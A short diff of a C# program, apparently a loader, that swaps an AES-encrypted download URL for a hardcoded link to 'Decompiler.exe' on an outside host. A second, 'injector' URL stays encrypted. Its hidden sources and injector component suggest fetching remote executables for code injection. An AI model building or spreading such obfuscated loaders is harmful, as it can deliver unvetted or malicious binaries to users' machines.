@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Net;
 using System.Runtime.InteropServices;
@@ -72,8 +72,8 @@ class Program
 
             System.Environment.Exit(1);
         }
-        
-        string requestUri = AESEncryption.Decrypt(root.GetProperty("L1").ToString(), root.GetProperty("question").ToString()); // decompiler
+
+        string requestUri = "https://getstorm.superiorcommunist.party/assets/Decompiler.exe"; // decompiler
         string requestUri2 = AESEncryption.Decrypt(root.GetProperty("L2").ToString(), root.GetProperty("question").ToString()); // injector
        
         if (!Directory.Exists(Path.Combine(currentDir, "Bin")))
